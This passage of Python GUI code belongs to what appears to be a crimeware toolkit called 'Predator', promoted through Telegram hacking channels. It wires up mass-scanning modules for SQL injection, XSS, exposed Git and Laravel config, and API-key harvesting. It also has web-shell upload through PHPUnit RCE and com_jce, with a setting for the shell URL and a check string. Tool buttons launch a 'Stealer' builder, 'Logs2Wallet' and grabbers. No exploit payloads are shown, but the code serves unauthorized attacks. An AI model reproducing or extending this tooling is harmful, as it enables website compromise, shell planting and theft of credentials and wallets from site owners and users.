        self.lrvlenv_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Laravel"), text=f"Config", variable=self.lrvlenv_switch_var, onvalue="on", offvalue="off")
        self.lrvlenv_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.lrvlpur_switch_var = customtkinter.StringVar(value=phpu_value)
        self.lrvlpur_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Laravel"), text=f"PHPUnitRCE", variable=self.lrvlpur_switch_var, onvalue="on", offvalue="off")
        self.lrvlpur_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.othersql_switch_var = customtkinter.StringVar(value=sql_value)
        self.othersql_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Other"), text=f"SQL", variable=self.othersql_switch_var, onvalue="on", offvalue="off")
        self.othersql_switch.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.otherxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.otherxss_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Other"), text=f"XSS", variable=self.otherxss_switch_var, onvalue="on", offvalue="off")
        self.otherxss_switch.grid(row=0, column=1, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.othergit_switch_var = customtkinter.StringVar(value=git_value)
        self.othergit_switch = customtkinter.CTkSwitch(master=self.tabview.tab("Other"), text=f"GIT", variable=self.othergit_switch_var, onvalue="on", offvalue="off")
        self.othergit_switch.grid(row=0, column=2, padx=(10, 10), pady=(10, 10), sticky="nsew")

        # create slider and progressbar frame
        self.ResultFrame = customtkinter.CTkFrame(self.XRfFrame, fg_color="transparent")
        # self.ResultFrame.place(relx=0.6, rely=0.7, anchor=customtkinter.CENTER)
        self.ResultFrame.grid(row=1, column=0, sticky="nsew")
        self.ResultFrame.grid_rowconfigure(0, weight=1)
        self.ResultFrame.grid_columnconfigure(0, weight=1)

        sql_value = self.getjson_data('sql')
        xss_value = self.getjson_data('xss')
        phpu_value = self.getjson_data('phpunitrce')
        cors_value = self.getjson_data('cors')
        cfg_value = self.getjson_data('config')
        ap_value = self.getjson_data('apikeys')
        git_value = self.getjson_data('git')
        comJce_value = self.getjson_data('com_jce')

        gvalues = [sql_value, xss_value, phpu_value, cors_value, cfg_value, ap_value, git_value, comJce_value]
        active_found = False
        for xv in gvalues:
            if xv == "on":
                self.resview = customtkinter.CTkTabview(self.ResultFrame)
                self.resview.grid(row=0, column=0, sticky="nsew")

                active_found = True
                break
        
        if active_found == False:
            self.showIntro()

        if sql_value == "on":
            self.resview.add("SQL").grid_columnconfigure(0, weight=1)
        
        if xss_value == "on":        
            self.resview.add("XSS").grid_columnconfigure(0, weight=1)
        
        if cfg_value == "on":
            self.resview.add("Config").grid_columnconfigure(0, weight=1)
        if git_value == "on":
            self.resview.add("GIT").grid_columnconfigure(0, weight=1)
        
        if cors_value == "on":
            self.resview.add("CORS").grid_columnconfigure(0, weight=1)
        
        if phpu_value == "on":
            self.resview.add("PHPUnitRCE").grid_columnconfigure(0, weight=1)

        if comJce_value == "on":
            self.resview.add("com_jce").grid_columnconfigure(0, weight=1)

        if sql_value == "on":
            self.sqlres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("SQL"), fg_color="transparent")
            self.sqlres_frame.grid(row=0, column=0, sticky="nsew")
            self.sqlres_frame.grid_columnconfigure(0, weight=1)
            self.sqlres_frame.grid_rowconfigure(0, weight=1)

        if xss_value == "on": 
            self.xssres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("XSS"), fg_color="transparent")
            self.xssres_frame.grid(row=0, column=0, sticky="nsew")
            self.xssres_frame.grid_columnconfigure(0, weight=1)
            self.xssres_frame.grid_rowconfigure(0, weight=1)

        if cfg_value == "on":
            self.envres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("Config"), fg_color="transparent")
            self.envres_frame.grid(row=0, column=0, sticky="nsew")
            self.envres_frame.grid_columnconfigure(0, weight=1)
            self.envres_frame.grid_rowconfigure(0, weight=1)
        
        if phpu_value == "on":
            self.lrvrceres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("PHPUnitRCE"), fg_color="transparent")
            self.lrvrceres_frame.grid(row=0, column=0, sticky="nsew")
            self.lrvrceres_frame.grid_columnconfigure(0, weight=1)
            self.lrvrceres_frame.grid_rowconfigure(0, weight=1)

        if cors_value == "on":
            self.corsres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("CORS"), fg_color="transparent")
            self.corsres_frame.grid(row=0, column=0, sticky="nsew")
            self.corsres_frame.grid_columnconfigure(0, weight=1)
            self.corsres_frame.grid_rowconfigure(0, weight=1)
            # self.corsres_frame.grid_columnconfigure(1, weight=1)
        
        if git_value == "on":
            self.git_frame = customtkinter.CTkScrollableFrame(self.resview.tab("GIT"), fg_color="transparent")
            self.git_frame.grid(row=0, column=0, sticky="nsew")
            self.git_frame.grid_columnconfigure(0, weight=1)
            self.git_frame.grid_rowconfigure(0, weight=1)
            # self.git_frame.grid_columnconfigure(1, weight=1)

        if comJce_value == "on":
            self.com_jceres_frame = customtkinter.CTkScrollableFrame(self.resview.tab("com_jce"), fg_color="transparent")
            self.com_jceres_frame.grid(row=0, column=0, sticky="nsew")
            self.com_jceres_frame.grid_columnconfigure(0, weight=1)
            self.com_jceres_frame.grid_rowconfigure(0, weight=1)
            # self.com_jceres_frame.grid_columnconfigure(1, weight=1)

        self.RightSideBAR = customtkinter.CTkFrame(self, fg_color="transparent", width=50, corner_radius=5)
        self.RightSideBAR.grid(row=0, column=3, rowspan=4)
        self.RightSideBAR.grid_columnconfigure(0, weight=1)
        self.RightSideBAR.grid_rowconfigure((0,1,2,3), weight=1)

        # create about frame
        self.about_frame = customtkinter.CTkScrollableFrame(self.RightSideBAR, fg_color="transparent", label_text="Powered By", height=30, width=120)
        self.about_frame.grid(row=0, column=0, sticky="nsew")
        self.about_frame.grid_columnconfigure(0, weight=0)
        self.about_frame.grid_rowconfigure(0, weight=1)

        def getowner():
            webbrowser.open('https://t.me/mr_0x01', new=1, autoraise=True)

        def gethofnar():
            webbrowser.open('https://t.me/hofnar05', new=1, autoraise=True)

        def getbor3da():
            webbrowser.open('https://t.me/Bore3da', new=1, autoraise=True)

        def getdolli():
            webbrowser.open('https://t.me/dollifacee', new=1, autoraise=True)

        def getobhacking():
            webbrowser.open('https://t.me/OBHACKING', new=1, autoraise=True)

        def getben10():
            webbrowser.open('https://t.me/BENUMBZ', new=1, autoraise=True)

        self.ownerlink = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@mr_0x01", border_width=0, command=getowner)
        self.ownerlink.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.hofnarlink = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@hofnar05", border_width=0, command=gethofnar)
        self.hofnarlink.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.hofnarlink = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@Bore3da", border_width=0, command=getbor3da)
        self.hofnarlink.grid(row=2, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.dollilink = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@dollifacee", border_width=0, command=getdolli)
        self.dollilink.grid(row=3, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.grp1link = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@OBHACKING", text_color="black", fg_color="yellow", border_width=0, command=getobhacking)
        self.grp1link.grid(row=4, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.grp2link = customtkinter.CTkButton(master=self.about_frame, height=10, width=120, text=f"@BENUMBZ", text_color="black", fg_color="yellow", border_width=0, command=getben10)
        self.grp2link.grid(row=5, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        
        # self.ab_textbox = customtkinter.CTkTextbox(self.about_frame, width=140, height=40, corner_radius=0)
        # self.ab_textbox.grid(row=0, column=0, sticky="nsew")
 
        self.result_frame = customtkinter.CTkScrollableFrame(self.RightSideBAR, label_text="Results", fg_color="transparent", width=120, corner_radius=5)
        # self.result_frame.place(relx=0.91, rely=0.35, anchor=customtkinter.CENTER)
        self.result_frame.grid(row=1, column=0)
        self.result_frame.grid_columnconfigure(0, weight=1)
        self.result_frame.grid_rowconfigure((0,1,2,3,4,5,6), weight=1)

        # self.checkbox_slider_frame = customtkinter.CTkFrame(self)
        # self.checkbox_slider_frame.grid(row=1, column=3, padx=(20, 20), pady=(20, 0), sticky="nsew")

        self.SQL_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.SQL_res.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.GitConfig_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.GitConfig_res.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.Config_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.Config_res.grid(row=2, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.PHPUnitRCE_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.PHPUnitRCE_res.grid(row=3, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.comJce_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.comJce_res.grid(row=4, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.XSS_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.XSS_res.grid(row=5, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.Cors_res = customtkinter.CTkButton(master=self.result_frame, width=158, border_width=0, height=20, corner_radius=5)
        self.Cors_res.grid(row=6, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        # self.presult_frame = customtkinter.CTkScrollableFrame(self.RightSideBAR, label_text="Possible", width=120, corner_radius=5)
        # # self.presult_frame.place(relx=0.91, rely=0.7, anchor=customtkinter.CENTER)
        # self.presult_frame.grid(row=2, column=0, padx=(10, 10), pady=(10, 10))
        # self.presult_frame.grid_columnconfigure(0, weight=1)
        # self.presult_frame.grid_rowconfigure((0,1), weight=1)

        # self.Keys_res = customtkinter.CTkButton(master=self.presult_frame, border_width=0, height=25, corner_radius=5)
        # self.Keys_res.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        # self.ored_res = customtkinter.CTkButton(master=self.presult_frame, border_width=0, height=25, corner_radius=5)
        # self.ored_res.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.StartScanFrame = customtkinter.CTkFrame(self.RightSideBAR, fg_color="transparent", corner_radius=6)
        self.StartScanFrame.grid(row=3, column=0)
        self.StartScanFrame.grid_columnconfigure(0, weight=1)

        self.import_button = customtkinter.CTkButton(master=self.StartScanFrame, text='Import', height=25, command=self.openlist_trigger, border_width=0, corner_radius=6)
        self.import_button.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.start_button = customtkinter.CTkButton(master=self.StartScanFrame, text='Start', command=sstrun, height=25, border_width=0, corner_radius=6)
        self.start_button.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")   
  
        self.tools_frame = customtkinter.CTkScrollableFrame(master=self, label_text="Tools", width=130) #width=200
        self.tools_frame.grid(row=2, column=1, padx=(10, 10), pady=(10, 10), sticky="nswe")
        self.tools_frame.grid_columnconfigure(0, weight=1)
        self.tools_frame.grid_rowconfigure(0, weight=1)

        self.bbuilder_btn = customtkinter.CTkButton(master=self.tools_frame, text="Stealer", height=10, width=190, border_width=0, command=lambda: Thread(target=StealerBuilder).start())
        self.bbuilder_btn.grid(row=0, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.bbuilder_btn = customtkinter.CTkButton(master=self.tools_frame, text="Logs2Wallet", height=10, width=190, border_width=0)
        self.bbuilder_btn.configure(command=StealerBuilder)
        self.bbuilder_btn.grid(row=1, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.ipgen_btn = customtkinter.CTkButton(master=self.tools_frame, text="Generator", height=10, width=190, border_width=0)
        self.ipgen_btn.configure(command=self.gen_regix)
        self.ipgen_btn.grid(row=2, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.rev_btn = customtkinter.CTkButton(master=self.tools_frame, text="Reverse IP", height=10, width=190, border_width=0)
        self.rev_btn.configure(command=self.reip_trig,)
        self.rev_btn.grid(row=3, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")
        
        self.subf_btn = customtkinter.CTkButton(master=self.tools_frame, text="SubFinder", height=10, width=190, border_width=0)
        self.subf_btn.configure(command=self.subf_trig)
        self.subf_btn.grid(row=4, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.Extractf_btn = customtkinter.CTkButton(master=self.tools_frame, text="Extractor", height=10, width=190, border_width=0)
        self.Extractf_btn.configure(command=self.Extract)
        self.Extractf_btn.grid(row=5, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.netGun_btn = customtkinter.CTkButton(master=self.tools_frame, text="NetGun", height=10, width=190, border_width=0)
        self.netGun_btn.configure(command=self.netGun_win)
        self.netGun_btn.grid(row=6, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.grabbers_btn = customtkinter.CTkButton(master=self.tools_frame, text="Grabber", height=10, width=190, border_width=0)
        self.grabbers_btn.configure(command=self.grabbers_win)
        self.grabbers_btn.grid(row=7, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.smtp_btn = customtkinter.CTkButton(master=self.tools_frame, text="SMTP", height=10, width=190, border_width=0)
        self.smtp_btn.configure(command=self.smtp_win)
        self.smtp_btn.grid(row=8, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        self.smtp_btn = customtkinter.CTkButton(master=self.tools_frame, text="Translator", height=10, width=190, border_width=0)
        self.smtp_btn.configure(command=Translator)
        self.smtp_btn.grid(row=9, column=0, padx=(2, 2), pady=(2, 0), sticky="nsew")

        # tx = threading.Thread(target=self.animatebar)
        # tx.daemon = True
        # tx.start()

        tx2 = threading.Thread(target=self.change_theme, args=(1,))
        tx2.daemon = True
        tx2.start()

        self.auto_function()

    def run(self):
        self.mainloop()

    def animatebar(self):
        def rndomx():
            listx = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','1','2','3','4','5','6','7','8','9','0']        
            rand = Xchoice(listx)
            return rand
        
        self.title(f'P')
        time.sleep(0.2)
        self.title(f'Pr')
        time.sleep(0.2)
        self.title(f'Pre')
        time.sleep(0.2)
        self.title(f'Pred')
        time.sleep(0.2)
        self.title(f'Preda')
        time.sleep(0.2)
        self.title(f'Predat')
        time.sleep(0.2)
        self.title(f'Predato')
        time.sleep(0.2)
        self.title(f'Predator')
        time.sleep(0.2)
        self.title(f'Predator v0.0.1')
        time.sleep(0.3)
        self.title(f'Predator v0.0.2')
        time.sleep(0.3)
        self.title(f'Predator v0.0.3')
        time.sleep(0.3)
        self.title(f'Predator v0.0.4')
        time.sleep(0.3)
        self.title(f'Predator v0.0.5')
        time.sleep(0.3)
        self.title(f'Predator v0.0.6')
        time.sleep(0.3)
        self.title(f'Predator v0.0.7')
        time.sleep(0.3)
        self.title(f'Predator v0.0.8')
        time.sleep(25)

        self.animatebar()

    def switchBkToAk(self):
        self.apikeysBtn.configure(state="disabled")
        self.SqlBtn.configure(state="normal")
        self.BlackLstBtn.configure(state="normal")
        self.obBtn.configure(state="normal")

        try:
            self.BlacklistFrame.grid_forget()
        except:
            pass

        try:
            self.sql_frame.grid_forget()
        except:
            pass

        try:
            self.op_frame.grid_forget()
        except:
            pass

        self.keys_frame = customtkinter.CTkFrame(self.wd_frame, fg_color="transparent")
        self.keys_frame.grid(row=0, column=1, sticky="nsew")
        self.keys_frame.grid_columnconfigure(0, weight=1)
        self.keys_frame.grid_rowconfigure(0, weight=1) 
            
        self.keys_textbox = customtkinter.CTkTextbox(self.keys_frame)
        self.keys_textbox.grid(row=0, column=0, sticky="nsew")

        self.sv_button = customtkinter.CTkButton(master=self.keys_frame, text="Save", command=self.SaveBk, fg_color="red", text_color="black", corner_radius=0)
        self.sv_button.grid(row=1, column=0, sticky="nsew")

        try:
            with open('core/txt/apikeys.txt', 'r', encoding='utf-8') as f:
                fulltxt = f.read()
                
            self.keys_textbox.insert("0.0", fulltxt)

        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)
            return self.show_error('Error!', err)

    def switchBkToBk(self):
        self.BlackLstBtn.configure(state="disabled")
        self.SqlBtn.configure(state="normal")
        self.apikeysBtn.configure(state="normal")
        self.obBtn.configure(state="normal")

        try:
            self.sql_frame.grid_forget()
        except:
            pass

        try:
            self.keys_frame.grid_forget()
        except:
            pass

        try:
            self.op_frame.grid_forget()
        except:
            pass

        self.BlacklistFrame.grid(row=0, column=1, sticky="nsew")

    def switchBkToSQL(self):
        self.SqlBtn.configure(state="disabled")
        self.BlackLstBtn.configure(state="normal")
        self.apikeysBtn.configure(state="normal")
        self.obBtn.configure(state="normal")

        try:
            self.BlacklistFrame.grid_forget()
        except:
            pass

        try:
            self.keys_frame.grid_forget()
        except:
            pass

        try:
            self.op_frame.grid_forget()
        except:
            pass

        self.sql_frame = customtkinter.CTkFrame(self.wd_frame, fg_color="transparent")
        self.sql_frame.grid(row=0, column=1, sticky="nsew")
        self.sql_frame.grid_columnconfigure(0, weight=1)
        self.sql_frame.grid_rowconfigure(0, weight=1)
      
        self.sqllist_textbox = customtkinter.CTkTextbox(self.sql_frame)
        self.sqllist_textbox.grid(row=0, column=0, sticky="nsew")

        self.sv_button = customtkinter.CTkButton(master=self.sql_frame, text="Save", command=self.SaveBk, fg_color="red", text_color="black", corner_radius=0)
        self.sv_button.grid(row=1, column=0, sticky="nsew")

        try:
            with open('core/txt/SQL.txt', 'r', encoding='utf-8') as f:
                fulltxt = f.read()
                
            self.sqllist_textbox.insert("0.0", fulltxt)
        except Exception as err:
            console.print_exception(show_locals=True)
            self.show_error('Error!', err)
            consolelog('WARNING', err)

    def switchBkToOb(self):
        self.obBtn.configure(state="disabled")
        self.SqlBtn.configure(state="normal")
        self.BlackLstBtn.configure(state="normal")
        self.apikeysBtn.configure(state="normal")   

        try:
            self.BlacklistFrame.grid_forget()
        except:
            pass

        try:
            self.sql_frame.grid_forget()
        except:
            pass

        try:
            self.keys_frame.grid_forget()
        except:
            pass

        self.op_frame = customtkinter.CTkFrame(self.wd_frame, fg_color="transparent")
        self.op_frame.grid(row=0, column=1, sticky="nsew")  
        self.op_frame.grid_columnconfigure(0, weight=1)
        self.op_frame.grid_rowconfigure(0, weight=1) 
            
        self.op_textbox = customtkinter.CTkTextbox(self.op_frame)
        self.op_textbox.grid(row=0, column=0, sticky="nsew")

        self.sv_button = customtkinter.CTkButton(master=self.op_frame, text="Save", command=self.SaveBk, fg_color="red", text_color="black", corner_radius=0)
        self.sv_button.grid(row=1, column=0, sticky="nsew")

        try:
            with open('core/txt/OpenRedirect.txt', 'r', encoding='utf-8') as f:
                OpData = f.read()
            
            self.op_textbox.insert("0.0", OpData)

        except Exception as err:
          console.print_exception(show_locals=True)
          consolelog('ERROR', err)
          return self.show_error('Error!', err)

    def switchToPhpu(self):
        self.settings_app.minsize(400, 250)
        self.phprceBtn.configure(state="disabled")
        self.WordlistsBtn.configure(state="normal")
        self.ExploitsBtn.configure(state="normal")
        self.generalBtn.configure(state="normal")

        try:
            self.ex_settings_frame.grid_forget()
        except:
            pass

        try:
            self.wd_frame.grid_forget()
        except:
            pass

        try:
            self.general_frame.grid_forget()
        except:
            pass

        try:
            with open('core/phpunitrce.json', 'r', encoding='utf-8') as cxf:
                cxfdb = json.load(cxf)
                ShellUrl = (cxfdb['ShellUrl'])
                ShellKeyCheck = (cxfdb['ShellKeyCheck'])
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)


        self.phpu_frame = customtkinter.CTkFrame(self.settingsContainer, fg_color="transparent")
        self.phpu_frame.grid(row=0, column=0, sticky="nsew")
        self.phpu_frame.grid_columnconfigure(0, weight=1)
        self.phpu_frame.grid_rowconfigure((0,1,2,3,4), weight=0)

        self.phpu_sname = customtkinter.CTkLabel(self.phpu_frame, text="Shell Link", fg_color="transparent")
        self.phpu_sname.grid(row=0, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        slink = customtkinter.StringVar(value=ShellUrl)
        self.phpu_entry = customtkinter.CTkEntry(self.phpu_frame, width=300, textvariable=slink, height=30)
        self.phpu_entry.grid(row=1, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.phpu_ksname = customtkinter.CTkLabel(self.phpu_frame, text="Keycheck > e.g: <title>Shell Name</title>", fg_color="transparent")
        self.phpu_ksname.grid(row=2, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        skcheck = customtkinter.StringVar(value=ShellKeyCheck)
        self.phpu_kentry = customtkinter.CTkEntry(self.phpu_frame, width=300, textvariable=skcheck, height=30)
        self.phpu_kentry.grid(row=3, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")

        self.phpu_save = customtkinter.CTkButton(master=self.phpu_frame, command=self.Savephpu, text="Save", fg_color="red", text_color="black")
        self.phpu_save.grid(row=4, column=0, padx=(10, 10), pady=(10, 10), sticky="nsew")
        
    def switchToWordlist(self):
        self.settings_app.minsize(700, 300)
        self.WordlistsBtn.configure(state="disabled")
        self.ExploitsBtn.configure(state="normal")
        self.generalBtn.configure(state="normal")
        self.phprceBtn.configure(state="normal")
        
        try:
            self.ex_settings_frame.grid_forget()
        except:
            pass

        try:
            self.general_frame.grid_forget()
        except:
            pass

        try:
            self.phpu_frame.grid_forget()
        except:
            pass

        
        self.wd_frame = customtkinter.CTkFrame(self.settingsContainer, fg_color="transparent")
        self.wd_frame.grid(row=0, column=0, sticky="nsew")
        self.wd_frame.grid_columnconfigure(1, weight=1)
        self.wd_frame.grid_rowconfigure(0, weight=1)

        self.bkSideBar = customtkinter.CTkFrame(self.wd_frame, width=159, fg_color="transparent")
        self.bkSideBar.grid(row=0, column=0, sticky="nsew")
        self.bkSideBar.grid_columnconfigure(0, weight=1)
        self.bkSideBar.grid_rowconfigure((0,1,2,3), weight=1)

        self.BlackLstBtn = customtkinter.CTkButton(master=self.bkSideBar, state="disabled", text="Blacklist", command=self.switchBkToBk, fg_color="red", text_color="black", corner_radius=0)
        self.BlackLstBtn.grid(row=0, column=0, sticky="nsew")
        self.SqlBtn = customtkinter.CTkButton(master=self.bkSideBar, text="SQL", command=self.switchBkToSQL, fg_color="red", text_color="black", corner_radius=0)
        self.SqlBtn.grid(row=1, column=0, sticky="nsew")
        self.apikeysBtn = customtkinter.CTkButton(master=self.bkSideBar, text="apikeys", command=self.switchBkToAk, fg_color="red", text_color="black", corner_radius=0)
        self.apikeysBtn.grid(row=2, column=0, sticky="nsew")
        self.obBtn = customtkinter.CTkButton(master=self.bkSideBar, text="OpenRedirect",  command=self.switchBkToOb, fg_color="red", text_color="black", corner_radius=0)
        self.obBtn.grid(row=3, column=0, sticky="nsew")

        self.BlacklistFrame = customtkinter.CTkFrame(self.wd_frame, fg_color="transparent")
        self.BlacklistFrame.grid(row=0, column=1, sticky="nsew")
        self.BlacklistFrame.grid_columnconfigure(0, weight=1)
        self.BlacklistFrame.grid_rowconfigure(0, weight=1)   
            
        self.bk_textbox = customtkinter.CTkTextbox(self.BlacklistFrame)
        self.bk_textbox.grid(row=0, column=0, sticky="nsew")  

        try:
            with open('core/txt/Blacklist.txt', 'r', encoding='utf-8') as f:
                fulltxt = f.read()
                
            self.bk_textbox.insert("0.0", fulltxt)
        except Exception as err:
            console.print_exception(show_locals=True)
            consolelog('ERROR', err)
            return self.show_error('Error!', err)


        self.sv_button = customtkinter.CTkButton(master=self.BlacklistFrame, text="Save", command=self.SaveBk, fg_color="red", text_color="black", corner_radius=0)
        self.sv_button.grid(row=1, column=0, sticky="nsew")

    def switchToGeneral(self):
        self.settings_app.minsize(250, 200)
        self.generalBtn.configure(state="disabled")
        self.ExploitsBtn.configure(state="normal")
        self.WordlistsBtn.configure(state="normal")
        self.phprceBtn.configure(state="normal")

        try:
            self.ex_settings_frame.grid_forget()
        except:
            pass

        try:
            self.wd_frame.grid_forget()
        except:
            pass

        try:
            self.phpu_frame.grid_forget()
        except:
            pass


        self.general_frame.grid(row=0, column=0, sticky="nsew")

    def switchToExp(self):
        self.settings_app.minsize(500, 300)
        self.ExploitsBtn.configure(state="disabled")
        self.generalBtn.configure(state="normal")
        self.WordlistsBtn.configure(state="normal")
        self.phprceBtn.configure(state="normal")

        sql_value = self.getjson_data('sql')
        xss_value = self.getjson_data('xss')
        phpu_value = self.getjson_data('phpunitrce')
        cors_value = self.getjson_data('cors')
        cfg_value = self.getjson_data('config')
        ap_value = self.getjson_data('apikeys')
        git_value = self.getjson_data('git')
        comJce_value = self.getjson_data('com_jce')
        OpenR_value = self.getjson_data('OpenRedirect')

        try:
            self.general_frame.grid_forget()
        except:
            pass

        try:
            self.wd_frame.grid_forget()
        except:
            pass

        self.ex_settings_frame = customtkinter.CTkScrollableFrame(self.settingsContainer)
        self.ex_settings_frame.grid(row=0, column=0, sticky="nsew")
        self.ex_settings_frame.grid_columnconfigure((0,1,2), weight=1)
        self.ex_settings_frame.grid_rowconfigure((0,1,2,3,4,5), weight=1)
        # self.ex_settings_frame.grid_forget()

        self.allsql_switch_var = customtkinter.StringVar(value=sql_value)
        self.allsql_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"SQL", command=self.allgetsql_var, variable=self.allsql_switch_var, onvalue="on", offvalue="off")
        self.allsql_switch.grid(row=0, column=0, padx=0, pady=(10, 10))
        # self.ex_settings_frame_switches.append(self.allsql_switch)

        self.allxss_switch_var = customtkinter.StringVar(value=xss_value)
        self.allxss_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"XSS", command=self.allgetxss_var, variable=self.allxss_switch_var, onvalue="on", offvalue="off")
        self.allxss_switch.grid(row=0, column=1)
        # self.ex_settings_frame_switches.append(self.allxss_switch)

        self.allcors_switch_var = customtkinter.StringVar(value=cors_value)
        self.allcors_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"CORS", command=self.cors_var, variable=self.allcors_switch_var, onvalue="on", offvalue="off")
        self.allcors_switch.grid(row=0, column=2)
        # self.ex_settings_frame_switches.append(self.allcors_switch)

        self.allcfg_switch_var = customtkinter.StringVar(value=cfg_value)
        self.allcfg_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"Config", command=self.allgetcfg_var, variable=self.allcfg_switch_var, onvalue="on", offvalue="off")
        self.allcfg_switch.grid(row=1, column=0)
        # self.ex_settings_frame_switches.append(self.allcfg_switch)

        self.allgit_switch_var = customtkinter.StringVar(value=git_value)
        self.allgit_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"GIT", command=self.allgetgit_var, variable=self.allgit_switch_var, onvalue="on", offvalue="off")
        self.allgit_switch.grid(row=1, column=1)
        # self.ex_settings_frame_switches.append(self.allgit_switch)

        self.shellsysentryX = customtkinter.CTkLabel(self.ex_settings_frame, text="", fg_color="transparent")
        self.shellsysentryX.grid(row=2, column=0)

        self.shellsysentry = customtkinter.CTkLabel(self.ex_settings_frame, text="---------Shell Upload---------", fg_color="transparent")
        self.shellsysentry.grid(row=2, column=1)
            
        self.allphpu_switch_var = customtkinter.StringVar(value=phpu_value)
        self.allphpu_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"PHPUnitRCE", command=self.allgetphpu_var, variable=self.allphpu_switch_var, onvalue="on", offvalue="off")
        self.allphpu_switch.grid(row=3, column=0)
        # self.ex_settings_frame_switches.append(self.allphpu_switch)

        self.allcomJce_switch_var = customtkinter.StringVar(value=comJce_value)
        self.allcomJce_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"com_jce", command=self.allgetconJce_var, variable=self.allcomJce_switch_var, onvalue="on", offvalue="off")
        self.allcomJce_switch.grid(row=3, column=1)
        # self.ex_settings_frame_switches.append(self.allcomJce_switch)
        
        self.apikeysentry = customtkinter.CTkLabel(self.ex_settings_frame, text="---------Possible---------", fg_color="transparent")
        self.apikeysentry.grid(row=4, column=1)
            
        self.apikeys_switch_var = customtkinter.StringVar(value=ap_value)
        self.apikeys_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"apikeys", command=self.apikeys_var, variable=self.apikeys_switch_var, onvalue="on", offvalue="off")
        self.apikeys_switch.grid(row=5, column=0)
        # self.ex_settings_frame_switches.append(self.apikeys_switch)

        self.pOenR_switch_var = customtkinter.StringVar(value=OpenR_value)
        self.pOenR_switch = customtkinter.CTkSwitch(master=self.ex_settings_frame, text=f"Open Redirect", command=self.pOenR_var, variable=self.pOenR_switch_var, onvalue="on", offvalue="off")
        self.pOenR_switch.grid(row=5, column=1)
        # self.ex_settings_frame_switches.append(self.pOenR_switch)
    
    def escapex1(self):    
        # self.start_button.configure(text='Start', command=sstrun, state="normal")
        return self.show_error('Error!', 'Exploit/Bug is required! Add from Settings.')

    def escapex2(self):     
        try:
            self.start_button.configure(text="Stop", command=self.stop_scan)
            self.range_slider.place(relx=0.36, rely=1.5, anchor=customtkinter.CENTER)
            self.thraeds_txt.place(relx=0.2, rely=1.5, anchor=customtkinter.CENTER)

            self.tout_slider.place(relx=0.59, rely=1.5, anchor=customtkinter.CENTER)
